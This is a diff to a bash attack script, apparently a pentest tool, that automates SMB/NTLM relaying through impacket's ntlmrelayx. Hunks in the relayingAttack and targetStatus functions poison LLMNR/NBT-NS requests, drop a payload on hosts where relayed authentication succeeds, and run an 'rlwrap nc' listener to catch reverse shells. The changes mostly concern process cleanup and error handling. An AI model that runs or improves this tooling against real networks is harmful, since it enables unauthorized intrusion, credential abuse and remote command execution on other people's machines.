@@ -36,17 +36,24 @@ function badExit(){
 
 	cleaning
 
-	if [ ! -z $terminal_nc_PID ];then
-		kill -9 $terminal_nc_PID 2>/dev/null
-		wait $terminal_nc_PID &>/dev/null
-   	fi
-	
+    nc_PID=$(netstat -tnualp | grep '/nc' 2>/dev/null | grep 'LISTEN' 2>/dev/null | grep $lport 2>/dev/null | awk '{print substr($NF, 1, length($NF)-3)}')
+    if [ ! -z $nc_PID ];then
+	  kill -9 $nc_PID &>/dev/null
+	  wait $nc_PID &>/dev/null
+    fi
+
+    if [ ! -z $terminal_nc_PID ];then
+	  kill -9 $terminal_nc_PID &>/dev/null
+	  wait $terminal_nc_PID &>/dev/null
+    fi
+
 	tput cnorm; exit 1
 
 }
 
 function goodExit(){
 
+    disown $terminal_nc_PID &>/dev/null
 	cleaning
 	tput cnorm; exit 0
 
@@ -55,7 +62,7 @@ function goodExit(){
 function ctrl_c(){
 
 	echo -e "\n${redColour}[D:]${endColour} Keyboard interruption detected! Exiting...\n"; badExit
-	
+
 }
 
 function banner(){
@@ -262,8 +269,9 @@ function targetStatus(){
 	status=$(grep 'Authenticating against smb://'$1 $(pwd)/impacket/ntlmrelayx.log | tail -1 | awk '{print $NF}')
 
 	if [[ "$status" == "SUCCEED" || "$status" == "SUCCEE" ]];then
+
 		echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; 
-		if [ "$(grep 'ScriptContainedMaliciousContent' $(pwd)/impacket/ntlmrelayx.log)" == "" ];then sleep 5; fi
+		if [ "$(grep 'ScriptContainedMaliciousContent' $(pwd)/impacket/ntlmrelayx.log 2>/dev/null)" == "" ];then sleep 5; fi
 
 		check=$(grep "Executed specified command on host: $1" -A11 $(pwd)/impacket/ntlmrelayx.log | tail -1 | awk '{print $4}' | cut -d',' -f1)
 		check2=$(grep "Executed specified command on host: $1" -A12 $(pwd)/impacket/ntlmrelayx.log | tail -1 | awk '{print $4}' | cut -d',' -f1)
@@ -348,19 +356,22 @@ function relayingAttack(){
 	terminal=$(ps -o comm= -p "$(($(ps -o ppid= -p "$(($(ps -o sid= -p "$$")))")))")
 	ncCommand='tput setaf 7; rlwrap nc -lvvnp '$lport
 	$terminal -hold -T $terminal -e "$SHELL -c '$ncCommand'" &>/dev/null &
-	if [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];then 
-		$terminal --window --hide-menubar -e "$SHELL -c '$ncCommand'" &>/dev/null & 
-	fi
-	
+	terminal_nc_PID=$!
+	if [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];then
+		$terminal --window --hide-menubar -e "$SHELL -c '$ncCommand'" &>/dev/null &
+	    terminal_nc_PID=$!
+    fi
+
 	sleep 2
 
-	if [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];then 
-		checkDependency "xterm"; 
+	if [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];then
+		checkDependency "xterm";
 		xterm -hold -T 'XTerm' -e "$SHELL -c '$ncCommand'" &>/dev/null &
+	    terminal_nc_PID=$!
 	fi
-	terminal_nc_PID=$!
 	
-    	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to locate terminal in the system. Existing...\n"; badExit; else echo -e "${blueColour}[:*]${endColour} Relay attack deployed, waiting for LLMNR/NBT-NS request...\n"; fi
+
+    if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Relay attack deployed, waiting for LLMNR/NBT-NS request...\n"; fi
 
 	portStatus='LISTEN'
 
@@ -381,10 +392,10 @@ function relayingAttack(){
 
 	while [ "$portStatus" == "LISTEN" ];do
 		while read line; do
-				if [ "$(grep $line $(pwd)/impacket/hostsStatus.tmp)" == '' ];then targetStatus "$line";	fi
+				if [ "$(grep $line $(pwd)/impacket/hostsStatus.tmp 2>/dev/null)" == '' ];then targetStatus "$line";	fi
 		done < $(pwd)/impacket/targets.txt
 
-		if [[ "$(wc -l $(pwd)/impacket/hostsStatus.tmp | awk '{print $1}')" == "$(wc -l $(pwd)/impacket/targets.txt | awk '{print $1}')" ]];then
+		if [[ "$(wc -l $(pwd)/impacket/hostsStatus.tmp 2>/dev/null | awk '{print $1}')" == "$(wc -l $(pwd)/impacket/targets.txt 2>/dev/null | awk '{print $1}')" ]];then
 			echo -e "\t${redColour}[:(]${endColour} No targets left to perform the relay\n"; break
 		fi
 		portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u);
@@ -398,7 +409,7 @@ function relayingAttack(){
 	if [[ "$portStatus" == "ESTABLISHED" && $checkrhost -eq 1 ]];then
 		echo -e "${greenColour}[:D]${endColour} Relaying against $rhost successful! Enjoy your shell!\n"; sleep 0.3
 	else
-		echo -e "${redColour}[:(]${endColour} Relay unsuccessful! May be you need more coffee\n"; sleep 0.3
+		echo -e "${redColour}[:(]${endColour} Relay unsuccessful! May be you need more coffee\n"; badExit
 	fi
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Killing Tmux session 'smbautorelay'\n"; sleep 0.3; fi
